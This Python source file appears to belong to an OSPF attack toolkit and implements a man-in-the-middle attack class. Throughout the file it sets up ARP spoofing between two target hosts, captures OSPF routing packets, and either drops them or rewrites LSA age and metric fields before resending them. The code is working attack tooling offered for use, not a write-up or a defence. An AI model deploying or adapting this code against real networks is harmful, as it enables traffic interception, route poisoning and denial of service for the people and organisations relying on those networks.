import threading
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import MITMConfig
from ospf_attack.core.packet import parse_ospf_packet
from ospf_attack.core.sniffer import Sniffer, HAS_PCAP
from ospf_attack.network.sender import PacketSender


class MITMAttack(BaseAttack):
    name = "mitm"
    description = "中间人攻击：拦截 OSPF 报文 → 篡改 → 转发"
    category = AttackCategory.PROTOCOL
    needs_repeated = True
    config: MITMConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._sniffer = Sniffer(iface=self.config.iface) if HAS_PCAP else None
        self._intercepted = 0
        self._modified = 0

        if self.config.sniff_mode.value == "arp_spoof":
            from ospf_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a or self.config.target_a,
                target_b=self.config.arp_target_b or self.config.target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

    def send_one_round(self) -> bool:
        if self._sniffer is None or not self._sniffer.available:
            return False

        self._sniffer.start(timeout=3)
        packets = self._sniffer.stop()

        for raw_pkt in packets:
            self._intercepted += 1
            try:
                pkt = parse_ospf_packet(raw_pkt)
                if pkt is None:
                    continue

                if self.config.action == "drop":
                    self._modified += 1
                    continue

                if self.config.action == "modify":
                    pkt = self._apply_rules(pkt)
                    self._modified += 1

                self._sender.send_raw(pkt)
            except ValueError:
                pass
            except Exception:
                pass

        return len(packets) > 0

    def _apply_rules(self, pkt):
        for rule in self.config.modify_rules:
            field = rule.get("field", "")
            value = rule.get("set")
            add = rule.get("add")
            try:
                if field == "lsa.age" and pkt.haslayer("OSPF_LSA_Hdr"):
                    if value is not None:
                        pkt["OSPF_LSA_Hdr"].age = int(value)
                    elif add is not None:
                        pkt["OSPF_LSA_Hdr"].age += int(add)
                elif field == "lsa.metric":
                    # metric is in LSA body, not header; try type-specific layers
                    if pkt.haslayer("OSPFLS"):
                        if value is not None:
                            pkt["OSPFLS"].metric = int(value)
            except (ValueError, KeyError, AttributeError):
                pass
        return pkt

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"MITM: intercepted={self._intercepted}, modified={self._modified}, action={self.config.action}",
        )

    def verify(self) -> bool:
        return self._modified > 0

    def teardown(self) -> None:
        if hasattr(self, "_arp_engine") and self._arp_engine:
            self._arp_engine.stop()
